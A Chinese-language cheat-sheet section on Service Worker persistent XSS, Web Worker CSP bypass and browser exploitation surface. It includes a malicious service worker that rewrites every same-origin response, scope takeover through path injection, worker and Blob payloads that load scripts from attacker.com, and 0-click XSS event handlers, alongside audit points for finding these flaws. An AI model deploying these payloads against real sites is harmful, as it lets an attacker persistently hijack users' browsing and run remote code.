## 九、Service Worker/Web Worker持久化与浏览器漏洞利用面

### 9.1 Service Worker持久化XSS
**核心价值**：SW注册后独立于页面生命周期运行，可拦截/篡改同源全部请求，实现跨页面持久化控制：
```javascript
// 场景1：XSS点内注册恶意SW（需SW脚本在同源或CSP允许的源）
navigator.serviceWorker.register('/sw.js');

// 恶意sw.js示例：拦截并篡改所有响应
self.addEventListener('fetch', (event) => {
  event.respondWith(
    fetch(event.request).then((res) => {
      // 篡改HTML响应注入payload
      return new Response(res.body.pipeThrough(transformStream), {headers: res.headers});
    })
  );
});

// 场景2：SW被劫持（Scope接管）
// 若注册代码用动态字符串构造URL，注入 "/" 扩大scope
navigator.serviceWorker.register('/api/user/' + userInput + '/sw.js');
// 路径穿越注入 → 注册到更高scope（如根目录）→ 劫持全站

// 场景3：importScripts注入
// sw.js内若importScripts(动态值)，可注入外部恶意脚本
self.importScripts('https://attacker.com/evil.js');
```
**审计点**：搜`serviceWorker.register`、检查SW脚本内`importScripts`/动态URL、检查SW scope是否可被用户输入影响。

### 9.2 Web Worker绕过CSP
```javascript
// Worker从其他源加载脚本，绕过页面CSP对主线程的限制
var w = new Worker('http://attacker.com/worker.js');
// worker.js: importScripts('http://attacker.com/x.js');

// Blob Worker
var b = new Blob(['importScripts("http://attacker.com/x.js")'],{type:'application/javascript'});
var u = URL.createObjectURL(b);
new Worker(u);

// SharedWorker / DedicatedWorker 数据传递
worker.postMessage(data) // 若worker内部把data写入innerHTML/eval → DOM XSS
```

### 9.3 浏览器漏洞利用面（0-click XSS / uXSS）
**Universal XSS（uXSS）**：跨源脚本执行，浏览器/扩展/协议处理器漏洞触发，通常0-click：
- **浏览器内核漏洞**：CVE-2021-1765（Chrome）、各类渲染器RCE前置
- **协议处理器滥用**：`mailto:`/`tel:`/自定义协议处理器的URL注入
- **PDF/Office内嵌HTML**：PDF打开时的JavaScript执行（老版本Adobe/Acrobat）
- **浏览器扩展漏洞**：恶意扩展或脆弱扩展的content script XSS
- **PWA/manifest**：manifest.json的`scope`/`start_url`恶意配置，web app安装劫持

**0-click XSS触发面（无需用户交互）：**
```javascript
// 自动加载触发（无需点击）
<img src=x onerror=...>
<svg onload=...>
<iframe src="javascript:...">  // 自动加载
// 页面生命周期事件
<body onload> / <link onload> / <script onload> / <style onload>
// CSS外部资源onload（部分浏览器）
```

**利用注意事项**：浏览器漏洞利用（0-day/n-day）属高危操作，仅在获得明确授权的高价值目标（如红队任务）中使用，且需搭建隔离环境验证。

